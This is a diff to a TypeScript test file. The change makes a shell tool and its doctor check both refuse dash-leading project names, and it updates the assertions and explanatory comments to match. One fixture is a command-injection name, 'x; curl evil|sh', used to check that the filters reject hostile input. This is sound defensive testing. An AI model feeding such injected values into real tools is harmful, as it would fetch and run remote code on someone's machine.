@@ -278,15 +278,18 @@ describe('the VERB writes where POOLS_DIR_NAME says, on a real box', () => {
 // FILENAME read off the box's own disk. Fix round 7 filters it, and the
 // comment beside that filter makes a CROSS-FILE claim in prose:
 //
-//   "The charset is `_ws_project_valid`'s own … The charset is shared; the
-//    leading-dash rule is this file's alone, and the parity test pins both
-//    halves rather than trusting this sentence."
+//   "The charset is `_ws_project_valid`'s own (grep `_ws_project_valid`,
+//    `^[A-Za-z0-9._-]+$`, no dot- or dash-leading), so no name `ccd` would
+//    ever CREATE is omitted — a cross-file claim, and
+//    `pool-name-parity.test.ts` measures it rather than trusting this
+//    sentence."
 //
 // This is that measurement, and the sentence sends the reader HERE, so a
 // describe that did not exist would make the disclosure itself false.
 //
-// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and once claimed
-// "no name `ccd` would ever CREATE is omitted". Both were wrong. The anchor
+// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and claimed "no name
+// `ccd` would ever CREATE is omitted" while `ccd` still created `-lead`. Both
+// were wrong then; path-identity W1b made the second true. The anchor
 // was wrong WHEN WRITTEN and then went further wrong as edits landed above
 // it — this file's own first correction of it named `ccd:3709`, which is
 // stale too, by exactly the mechanism it was describing. No pin was added
@@ -294,26 +297,28 @@ describe('the VERB writes where POOLS_DIR_NAME says, on a real box', () => {
 // every edit above it. The anchor is now a `grep` for the function's own
 // name, in both files, which cannot go stale without the name going with it.)
 //
-// WHAT THE MEASUREMENT FOUND IS NOT WHAT THE OLD SENTENCE
-// SAID. The two filters agree on eight of the nine names below and disagree
-// on the ninth: `-lead` is a name `ccd` DOES create — `_ws_project_valid`
-// accepts it (`-` is in the charset, and only a leading DOT is refused), and
-// `cmd_project_pool --project -lead --pool <p>` really writes the tag, both
-// measured below — and the doctor omits it anyway. The second half of the
-// same comment says so out loud ("A leading `-` is refused too: it is
-// shell-safe but would be read by `ccd` as a flag"), so the filter is
-// deliberate, not a drift; it is the summary clause that overstates.
+// WHAT THE MEASUREMENT FINDS NOW (path-identity spec §2.4). Until path-identity
+// W1b the two filters disagreed on one of the nine names below. `-lead` was a
+// name `ccd` DID create: `_ws_project_valid` refused only a leading DOT, and
+// `cmd_project_pool --project -lead --pool <p>` really wrote the tag. The
+// doctor omitted it anyway. A dash-leading project is how `ccd` could mint an
+// id spelled as a flag (project `-` with slug `actor` is `--actor`), so
+// `_ws_project_valid` gained its own leading-dash line, SEPARATE from the
+// charset line and the dot line, and the doctor's summary clause became true
+// as written. Both halves are measured below: the table, and `ccd` refusing
+// the tag.
 //
-// So the property pinned here is the TRUE one, and it is the one worth
-// having: the doctor's filter is a SUBSET of `ccd`'s grammar. Every name it
-// keeps is a name `ccd` would create, which is the safety direction — a
-// remedy never prints a command for a name that could not be a project — and
-// the only names it drops that `ccd` would keep are the leading-dash ones,
-// which is exactly the `-*` arm. That second half is measured over the nine
-// names below and no further — see that assertion's own note on what a table
-// of nine does and does not establish. A charset that drifted in either file
-// breaks the first half, in whichever direction it drifted.
-describe('the project-name grammar is one grammar in two files (and the doctor is stricter by exactly one arm)', () => {
+// So two properties are pinned here. First, the doctor's filter is a SUBSET of
+// `ccd`'s grammar. Every name it keeps is a name `ccd` would create, which is
+// the safety direction: a remedy never prints a command for a name that could
+// not be a project. Second, over the nine names below the two filters AGREE. A
+// leading-dash line dropped from `ccd` brings `-lead` back as the one
+// disagreement, which reds here even though the subset property stays green.
+// That second half is measured over the nine names below and no further; see
+// that assertion's own note on what a table of nine does and does not
+// establish. A charset that drifted in either file breaks the first half, in
+// whichever direction it drifted.
+describe('the project-name grammar is one grammar in two files (and both refuse a leading dash, path-identity spec §2.4)', () => {
   // Resolved once each rather than at each use, so the two shipped files
   // this describe reads have one name apiece — the same reason `ccdSrc`
   // above has one.
@@ -402,6 +407,14 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
     expect(omitPattern().split('|')).toContain('.*');
   });
 
+  it('ccd refuses a dash-leading name on a line of its own (path-identity spec §2.4)', () => {
+    // SEPARATE, as the dot rule is. Folded into the charset line, the charset
+    // read above stops matching. Folded into the dot line, a reader loses
+    // which rule refused. The doctor's `-*` arm is pinned by the whole-list
+    // case below.
+    expect(ccdValidFn()).toContain('[[ "$1" != -* ]] || return 1');
+  });
+
   it('the doctor omits the empty name and the leading-dash names too, and only those', () => {
     // The arm is a fixed list, so pin the WHOLE list rather than its members
     // one at a time: a fifth pattern appearing here is a widening of what the
@@ -448,8 +461,9 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
   };
 
   it('the two filters, run for real, answer this exact table', () => {
-    // Measured, name by name, against the shipped bytes of both files. The
-    // one row that is not agreement is `-lead`, and it is written out here
+    // Measured, name by name, against the shipped bytes of both files. Every
+    // row is agreement. `-lead` was the one disagreement until path-identity
+    // W1b gave `_ws_project_valid` its dash line, and it is written out here
     // rather than excused in prose, so a change to EITHER file that moved it
     // — in either direction — is a red line an author has to look at.
     const rows = measurePair();
@@ -459,7 +473,7 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
       'a_b': 'accept keep',
       'a-b': 'accept keep',
       '.hidden': 'refuse omit',
-      '-lead': 'accept omit',
+      '-lead': 'refuse omit',
       'x; curl evil|sh': 'refuse omit',
       'x y': 'refuse omit',
       '': 'refuse omit',
@@ -479,50 +493,63 @@ describe('the project-name grammar is one grammar in two files (and the doctor i
     expect(NAMES.filter((_, i) => rows[i]!.endsWith(' keep')).length).toBeGreaterThan(0);
   });
 
-  it('the only names they disagree on are the leading-dash ones', () => {
-    // The exact size of the gap the summary clause in `_check_pools` glosses
-    // over. A charset edit that made them disagree on one of these nine reds
-    // here and names it — and it reds where the subset property above stays
+  it('the two filters now disagree on none of the nine names', () => {
+    // The exact size of the gap, which path-identity W1b closed: `ccd` and the
+    // doctor both refuse a leading dash now. A charset edit, or a dash arm
+    // dropped from either file, that made them disagree on one of these nine
+    // reds here and names it. It reds where the subset property above stays
     // GREEN, because that property is one-directional: a doctor getting
     // STRICTER cannot print a command it should not have, so it is safe and
     // invisible there, and this is the assertion that sees it.
     //
     // WHAT THIS DOES NOT ESTABLISH: nine names are a table, not a proof over
     // every string. It shows the two filters agreeing where the design says
-    // they must and disagreeing only where the `-*` arm says they will; it
-    // cannot show there is no third disagreement nobody thought to write
-    // down. The charset equality above is the part that generalises.
+    // they must; it cannot show there is no disagreement nobody thought to
+    // write down. The charset equality above is the part that generalises.
     const rows = measurePair();
     const disagree = NAMES.filter((_, i) => rows[i] === 'accept omit' || rows[i] === 'refuse keep');
-    expect(disagree).toEqual(['-lead']);
-    expect(disagree.every((n) => n.startsWith('-'))).toBe(true);
+    expect(disagree).toEqual([]);
+    // Guards the guard: `toEqual([])` over a table that measured nothing would pass. Five names are
+    // refused by ccd and omitted by the doctor, `-lead` among them.
+    expect(NAMES.filter((_, i) => rows[i] === 'refuse omit')).toEqual(['.hidden', '-lead', 'x; curl evil|sh', 'x y', '']);
   });
 
   // ── the two ENDS of the claim, on real files ──────────────────────────
-  // Everything above runs the two filters in isolation. These two prove the
-  // filters are the ones the shipped tools actually use — that `-lead` is a
-  // tag `ccd` will really create, and that `_check_pools` really keeps it and
-  // the hostile name out of the printed command.
-  it('ccd really creates a tag whose name the doctor will omit', () => {
-    // Without this, "`-lead` is a name ccd would create" is a claim about a
-    // function nobody proved is reached. `cmd_project_pool`'s arity `case`
-    // binds `project=$2` positionally, so a leading dash is never read as a
-    // flag on the way in — measured here, not reasoned about.
+  // Everything above runs the two filters in isolation. These prove the
+  // filters are the ones the shipped tools actually use: `ccd` really refuses
+  // `-lead` and the hostile name, and `_check_pools` really keeps both out of
+  // the printed command.
+  it('ccd refuses to create a tag whose name the doctor would omit', () => {
+    // Without this, "ccd refuses `-lead`" is a claim about a function nobody
+    // proved is reached. `cmd_project_pool`'s arity `case` binds `project=$2`
+    // positionally, so a leading dash is never read as a flag on the way in.
+    // The refusal is `_ws_project_valid`'s dash line, measured here, not
+    // reasoned about (path-identity spec §2.4).
     const h = makeCcdHarness('ccrc-pool-dash-');
     try {
       fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
-      expect(h.sh('cmd_project_pool --project -lead --pool pool-a')).toBe('tagged -lead pool-a');
-      const p = path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead');
-      expect(fs.readFileSync(p, 'utf8')).toBe('pool-a');
+      let stderr = '';
+      let threw = false;
+      try {
+        h.sh('cmd_project_pool --project -lead --pool pool-a');
+      } catch (err) {
+        threw = true;
+        stderr = String((err as { stderr?: string }).stderr ?? '');
+      }
+      expect(threw, 'cmd_project_pool tagged a dash-leading project').toBe(true);
+      expect(stderr).toContain("invalid project '-lead'");
+      // And nothing landed: the refusal is BEFORE the filesystem.
+      expect(fs.existsSync(path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead'))).toBe(false);
     } finally {
       h.cleanup();
     }
   });
 
   it('ccd really REFUSES the hostile name, so the gate is the running function and not the first copy of it', () => {
-    // The negative arm the positive one above cannot supply. A second,
+    // The charset's negative arm, beside the dash one above. A second,
     // looser `_ws_project_valid` appended to `ccd/ccd` in a spelling the
-    // scan misses would still create `-lead` happily — measured — so
+    // scan misses would still create names the shipped one refuses (it
+    // created `-lead` happily, measured before the dash line), so
     // "ccd would never create this name" needs a name the gate must REFUSE,
     // run against the shipped file. `x; curl evil|sh` is the doctor's own
     // hostile fixture below, closing the loop: the reason the remedy may
